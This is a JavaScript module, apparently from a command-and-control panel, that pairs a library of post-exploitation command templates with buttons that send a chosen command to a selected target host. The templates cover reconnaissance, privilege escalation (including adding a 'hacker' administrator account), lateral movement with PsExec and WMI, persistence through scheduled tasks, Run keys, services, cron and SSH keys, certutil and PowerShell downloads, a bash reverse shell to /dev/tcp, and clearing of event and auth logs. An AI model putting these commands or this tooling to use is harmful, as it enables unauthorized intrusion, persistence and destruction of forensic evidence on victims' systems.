// app-cmdgen.js - 命令生成器（Windows/Linux 命令模板，参考 MSF/Cheatsheet）
// 分类：信息收集 / 权限提升 / 横向移动 / 持久化 / 痕迹清理 / 文件操作 / 网络探测

app.cmdTemplates = {
    '信息收集': [
        { os: 'windows', name: '当前用户', cmd: 'whoami', desc: '获取当前用户名' },
        { os: 'windows', name: '用户权限', cmd: 'whoami /priv', desc: '查看当前用户权限' },
        { os: 'windows', name: '用户组', cmd: 'whoami /groups', desc: '查看当前用户所属组' },
        { os: 'windows', name: '系统信息', cmd: 'systeminfo', desc: '获取完整系统信息' },
        { os: 'windows', name: '网络配置', cmd: 'ipconfig /all', desc: '查看所有网络接口' },
        { os: 'windows', name: '路由表', cmd: 'route print', desc: '查看路由表' },
        { os: 'windows', name: 'ARP缓存', cmd: 'arp -a', desc: '查看ARP缓存表' },
        { os: 'windows', name: '监听端口', cmd: 'netstat -ano | findstr LISTENING', desc: '查看所有监听端口' },
        { os: 'windows', name: '已建立连接', cmd: 'netstat -ano | findstr ESTABLISHED', desc: '查看已建立的网络连接' },
        { os: 'windows', name: '进程列表', cmd: 'tasklist /v', desc: '查看所有进程（详细信息）' },
        { os: 'windows', name: '服务列表', cmd: 'sc query state= all', desc: '查看所有服务' },
        { os: 'windows', name: '已装补丁', cmd: 'wmic qfe get HotFixID,InstalledOn', desc: '查看已安装补丁' },
        { os: 'windows', name: '已装软件', cmd: 'wmic product get Name,Version', desc: '查看已安装软件' },
        { os: 'windows', name: '所有用户', cmd: 'net user', desc: '列出所有本地用户' },
        { os: 'windows', name: '管理员组', cmd: 'net localgroup Administrators', desc: '查看管理员组成员' },
        { os: 'windows', name: '环境变量', cmd: 'set', desc: '查看所有环境变量' },
        { os: 'windows', name: '磁盘信息', cmd: 'wmic logicaldisk get name,freespace,size', desc: '查看磁盘空间' },
        { os: 'windows', name: '共享列表', cmd: 'net share', desc: '查看所有共享' },
        { os: 'windows', name: '域信息', cmd: 'nltest /dclist:domain', desc: '查看域控列表' },
        { os: 'linux', name: '当前用户', cmd: 'whoami', desc: '获取当前用户名' },
        { os: 'linux', name: '用户ID', cmd: 'id', desc: '查看用户ID和组ID' },
        { os: 'linux', name: '系统信息', cmd: 'uname -a', desc: '查看内核版本' },
        { os: 'linux', name: '发行版', cmd: 'cat /etc/os-release', desc: '查看发行版信息' },
        { os: 'linux', name: '网络接口', cmd: 'ip a', desc: '查看所有网络接口' },
        { os: 'linux', name: '监听端口', cmd: 'ss -tlnp', desc: '查看所有监听端口' },
        { os: 'linux', name: '进程列表', cmd: 'ps aux', desc: '查看所有进程' },
        { os: 'linux', name: '已装软件', cmd: 'dpkg -l | grep ^ii', desc: '查看已安装软件（Debian系）' },
        { os: 'linux', name: 'SUID文件', cmd: 'find / -perm -4000 -type f 2>/dev/null', desc: '查找SUID权限文件' },
        { os: 'linux', name: '可写目录', cmd: 'find / -writable -type d 2>/dev/null', desc: '查找可写目录' },
        { os: 'linux', name: 'crontab', cmd: 'crontab -l', desc: '查看定时任务' },
    ],
    '权限提升': [
        { os: 'windows', name: '查看补丁', cmd: 'wmic qfe list brief', desc: '查看缺失补丁（提权参考）' },
        { os: 'windows', name: 'AlwaysInstallElevated', cmd: 'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated', desc: '检查MSI提权' },
        { os: 'windows', name: '服务权限', cmd: 'accesschk.exe -uwcqv "Authenticated Users" * -accepteula', desc: '检查可写服务' },
        { os: 'windows', name: 'Unattended', cmd: 'dir /s /b C:\\Windows\\Panther\\*.xml', desc: '查找安装配置文件（含密码）' },
        { os: 'windows', name: '注册表凭据', cmd: 'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Winlogon', desc: '查看Winlogon凭据' },
        { os: 'windows', name: '添加用户', cmd: 'net user hacker P@ss123 /add && net localgroup Administrators hacker /add', desc: '添加管理员用户' },
        { os: 'linux', name: 'Sudo权限', cmd: 'sudo -l', desc: '查看当前用户sudo权限' },
        { os: 'linux', name: '内核版本', cmd: 'uname -r', desc: '查看内核版本（查找对应提权漏洞）' },
        { os: 'linux', name: 'Capabilities', cmd: 'getcap -r / 2>/dev/null', desc: '查找特殊capabilities' },
        { os: 'linux', name: '可写passwd', cmd: 'ls -la /etc/passwd', desc: '检查passwd是否可写' },
        { os: 'linux', name: 'NFS提权', cmd: 'cat /etc/exports', desc: '查看NFS导出配置' },
    ],
    '横向移动': [
        { os: 'windows', name: '域用户', cmd: 'net user /domain', desc: '列出域内所有用户' },
        { os: 'windows', name: '域管组', cmd: 'net group "Domain Admins" /domain', desc: '查看域管理员' },
        { os: 'windows', name: '域控', cmd: 'nltest /dclist:domain', desc: '列出域控服务器' },
        { os: 'windows', name: '共享资源', cmd: 'net view \\\\TARGET /all', desc: '查看目标共享（替换TARGET）' },
        { os: 'windows', name: '映射驱动', cmd: 'net use Z: \\\\TARGET\\C$ /user:DOMAIN\\user password', desc: '映射远程共享' },
        { os: 'windows', name: 'WMI执行', cmd: 'wmic /node:TARGET process call create "cmd.exe /c whoami"', desc: '远程执行命令（替换TARGET）' },
        { os: 'windows', name: 'PSEXEC', cmd: 'psexec \\\\TARGET -u DOMAIN\\user -p password cmd.exe', desc: 'PsExec远程执行' },
        { os: 'linux', name: 'SSH登录', cmd: 'ssh user@target -p 22', desc: 'SSH远程登录' },
        { os: 'linux', name: 'SCP传输', cmd: 'scp file.txt user@target:/tmp/', desc: 'SCP远程文件传输' },
    ],
    '持久化': [
        { os: 'windows', name: '计划任务', cmd: 'schtasks /create /tn "Update" /tr "cmd.exe /c calc" /sc minute /mo 1', desc: '创建计划任务（每分钟执行）' },
        { os: 'windows', name: '注册表自启', cmd: 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Update /t REG_SZ /d "C:\\update.exe" /f', desc: '添加注册表启动项' },
        { os: 'windows', name: '启动文件夹', cmd: 'copy update.exe "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"', desc: '复制到启动文件夹' },
        { os: 'windows', name: 'WMI事件订阅', cmd: 'wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE', desc: 'WMI持久化（需进一步配置）' },
        { os: 'windows', name: '服务安装', cmd: 'sc create Update binPath= "C:\\update.exe" start= auto', desc: '安装系统服务' },
        { os: 'linux', name: 'Crontab', cmd: '(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/update") | crontab -', desc: '添加定时任务' },
        { os: 'linux', name: 'SSH公钥', cmd: 'echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys', desc: '添加SSH公钥' },
        { os: 'linux', name: 'Systemd服务', cmd: 'cat > /etc/systemd/system/update.service << EOF\n[Unit]\nDescription=Update\n[Service]\nExecStart=/tmp/update\n[Install]\nWantedBy=multi-user.target\nEOF', desc: '创建systemd服务' },
    ],
    '痕迹清理': [
        { os: 'windows', name: '清空System日志', cmd: 'wevtutil cl System', desc: '清除System事件日志' },
        { os: 'windows', name: '清空Security日志', cmd: 'wevtutil cl Security', desc: '清除Security事件日志' },
        { os: 'windows', name: '清空Application日志', cmd: 'wevtutil cl Application', desc: '清除Application事件日志' },
        { os: 'windows', name: '清空所有日志', cmd: 'wevtutil el | Foreach-Object {wevtutil cl "$_"}', desc: '清除所有事件日志（PowerShell）' },
        { os: 'windows', name: '清除RDP记录', cmd: 'reg delete "HKCU\\Software\\Microsoft\\Terminal Server Client\\Default" /f', desc: '清除RDP连接记录' },
        { os: 'windows', name: '清除预读', cmd: 'del /q /f %windir%\\Prefetch\\*.pf', desc: '清除预读文件' },
        { os: 'linux', name: '清除历史', cmd: 'history -c && rm -f ~/.bash_history', desc: '清除命令历史' },
        { os: 'linux', name: '清除日志', cmd: 'cat /dev/null > /var/log/wtmp && cat /dev/null > /var/log/btmp', desc: '清除登录日志' },
        { os: 'linux', name: '清除auth', cmd: 'cat /dev/null > /var/log/auth.log', desc: '清除认证日志' },
    ],
    '文件操作': [
        { os: 'windows', name: '列目录', cmd: 'dir /a /s C:\\Users', desc: '递归列出目录（含隐藏文件）' },
        { os: 'windows', name: '查找文件', cmd: 'dir /s /b C:\\*.pdf', desc: '查找所有PDF文件' },
        { os: 'windows', name: '读文件', cmd: 'type C:\\Windows\\win.ini', desc: '查看文件内容' },
        { os: 'windows', name: '复制', cmd: 'copy C:\\source.txt D:\\dest.txt', desc: '复制文件' },
        { os: 'windows', name: '下载文件', cmd: 'certutil -urlcache -split -f http://127.0.0.1/file.exe C:\\file.exe', desc: 'certutil下载文件' },
        { os: 'windows', name: 'PowerShell下载', cmd: 'powershell -c "(New-Object Net.WebClient).DownloadFile(\'http://127.0.0.1/file.exe\',\'C:\\file.exe\')"', desc: 'PS下载文件' },
        { os: 'linux', name: '查找SUID', cmd: 'find / -perm -4000 2>/dev/null', desc: '查找SUID文件' },
        { os: 'linux', name: '查找密码', cmd: 'grep -rn "password" /etc/ /opt/ /home/ 2>/dev/null', desc: '搜索密码关键字' },
        { os: 'linux', name: '文件下载', cmd: 'wget http://127.0.0.1/file -O /tmp/file', desc: 'wget下载文件' },
        { os: 'linux', name: 'curl下载', cmd: 'curl -o /tmp/file http://127.0.0.1/file', desc: 'curl下载文件' },
    ],
    '网络探测': [
        { os: 'windows', name: 'Ping扫描', cmd: 'for /l %i in (1,1,254) do @ping -n 1 -w 100 192.168.1.%i | findstr Reply', desc: 'Ping扫描C段' },
        { os: 'windows', name: '端口扫描', cmd: 'powershell -c "1..1024 | % { try {(New-Object Net.Sockets.TcpClient).Connect(\'127.0.0.1\',$_); write-host \"OPEN: $_\"} catch {} }"', desc: 'PS端口扫描' },
        { os: 'linux', name: '存活探测', cmd: 'nmap -sn 192.168.1.0/24', desc: 'Nmap主机发现' },
        { os: 'linux', name: '端口扫描', cmd: 'nmap -sS -p 1-1000 192.168.1.1', desc: 'Nmap SYN扫描' },
        { os: 'linux', name: '服务识别', cmd: 'nmap -sV -p 80,443,22 192.168.1.1', desc: 'Nmap服务版本识别' },
        { os: 'linux', name: 'NC监听', cmd: 'nc -lvnp 4444', desc: 'Netcat监听端口' },
        { os: 'linux', name: 'NC反弹', cmd: 'bash -c "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"', desc: 'Bash反弹shell' },
    ],
};

app.cmdGenFilter = { os: '', category: '' };

app.renderCmdGen = function() {
    const categories = Object.keys(this.cmdTemplates);
    const osOptions = ['windows', 'linux'];
    let filtered = [];
    categories.forEach(cat => {
        this.cmdTemplates[cat].forEach(item => {
            if (this.cmdGenFilter.os && item.os !== this.cmdGenFilter.os) return;
            if (this.cmdGenFilter.category && cat !== this.cmdGenFilter.category) return;
            filtered.push({ ...item, category: cat });
        });
    });

    const grouped = {};
    filtered.forEach(item => {
        if (!grouped[item.category]) grouped[item.category] = [];
        grouped[item.category].push(item);
    });

    return `
        <div style="margin-bottom:16px;">
            <div style="display:flex; gap:12px; align-items:center; flex-wrap:wrap; margin-bottom:12px;">
                <div style="font-size:13px; color:#8b949e;">
                    <i class="fas fa-info-circle"></i> 参考 MSF / 渗透测试 Cheatsheet 的常用命令模板。点击命令卡片可一键发送到选中主机执行，或复制到命令终端。
                </div>
            </div>
            <div style="display:flex; gap:12px; align-items:center; flex-wrap:wrap;">
                <select class="select" style="max-width:160px;" onchange="app.cmdGenFilter.os=this.value; app.render()">
                    <option value="">所有系统</option>
                    ${osOptions.map(o => `<option value="${o}" ${this.cmdGenFilter.os === o ? 'selected' : ''}>${o === 'windows' ? 'Windows' : 'Linux'}</option>`).join('')}
                </select>
                <select class="select" style="max-width:200px;" onchange="app.cmdGenFilter.category=this.value; app.render()">
                    <option value="">所有分类</option>
                    ${categories.map(c => `<option value="${c}" ${this.cmdGenFilter.category === c ? 'selected' : ''}>${c}</option>`).join('')}
                </select>
                <div style="flex:1;"></div>
                <div style="font-size:12px; color:#8b949e;">
                    ${this.selectedClient ? `目标: <b style="color:#3fb950;">${this.selectedClient.hostname}</b> (${this.selectedClient.os || '?'})` : '<span style="color:#f85149;">未选中主机</span>'}
                </div>
            </div>
        </div>

        ${Object.keys(grouped).length === 0 ? `
            <div class="card" style="text-align:center; padding:60px; color:#8b949e;">
                <i class="fas fa-search" style="font-size:48px; margin-bottom:16px;"></i>
                <div>没有匹配的命令模板</div>
            </div>
        ` : Object.keys(grouped).map(cat => `
            <div class="card" style="padding:20px; margin-bottom:16px;">
                <h3 style="margin-bottom:14px; font-size:15px; color:#58a6ff;">
                    <i class="fas fa-folder"></i> ${cat}
                    <span style="font-size:12px; color:#8b949e; margin-left:8px;">(${grouped[cat].length})</span>
                </h3>
                <div style="display:grid; grid-template-columns:repeat(auto-fill, minmax(320px, 1fr)); gap:12px;">
                    ${grouped[cat].map((item, idx) => {
                        const safeCmd = item.cmd.replace(/'/g, "\\'").replace(/`/g, '\\`').replace(/\n/g, '\\n');
                        const osIcon = item.os === 'windows' ? 'fa-windows' : 'fa-linux';
                        const osColor = item.os === 'windows' ? '#58a6ff' : '#f85149';
                        return `
                        <div style="border:1px solid #21262d; border-radius:8px; padding:12px; background:#0d1117;">
                            <div style="display:flex; align-items:center; gap:8px; margin-bottom:8px;">
                                <i class="fab ${osIcon}" style="color:${osColor}; font-size:14px;"></i>
                                <b style="font-size:13px; color:#e0e6ed; flex:1;">${item.name}</b>
                                <button class="btn btn-secondary" style="padding:2px 8px; font-size:10px;" title="复制命令" onclick="app.copyCmd('${safeCmd}')">
                                    <i class="fas fa-copy"></i>
                                </button>
                                <button class="btn btn-primary" style="padding:2px 8px; font-size:10px;" title="发送到主机执行" onclick="app.runCmdTemplate('${safeCmd}')">
                                    <i class="fas fa-play"></i>
                                </button>
                            </div>
                            <div style="font-family:monospace; font-size:11px; color:#7ee787; background:#161b22; padding:8px; border-radius:4px; word-break:break-all; max-height:80px; overflow:auto;">
                                ${item.cmd.replace(/</g,'&lt;').replace(/>/g,'&gt;')}
                            </div>
                            <div style="font-size:11px; color:#8b949e; margin-top:6px;">${item.desc}</div>
                        </div>
                        `;
                    }).join('')}
                </div>
            </div>
        `).join('')}
    `;
};

// 复制命令到剪贴板
app.copyCmd = function(cmd) {
    navigator.clipboard.writeText(cmd).then(() => {
        this._notify('命令已复制到剪贴板', 'success');
    }).catch(() => {
        // fallback: 创建临时 textarea
        const ta = document.createElement('textarea');
        ta.value = cmd;
        document.body.appendChild(ta);
        ta.select();
        try { document.execCommand('copy'); this._notify('命令已复制', 'success'); }
        catch(e) { this._notify('复制失败', 'error'); }
        document.body.removeChild(ta);
    });
};

// 一键下发命令模板到选中主机
app.runCmdTemplate = async function(cmd) {
    if (!this.selectedClient) {
        this._notify('请先在主机管理中选择一台主机', 'error');
        return;
    }
    const os = this.selectedClient.os || '';
    // 自动判断 shell
    let shell = 'cmd';
    if (os && os.toLowerCase() === 'linux') shell = 'bash';
    await this.sendTask('cmd', { command: cmd, shell: shell });
};
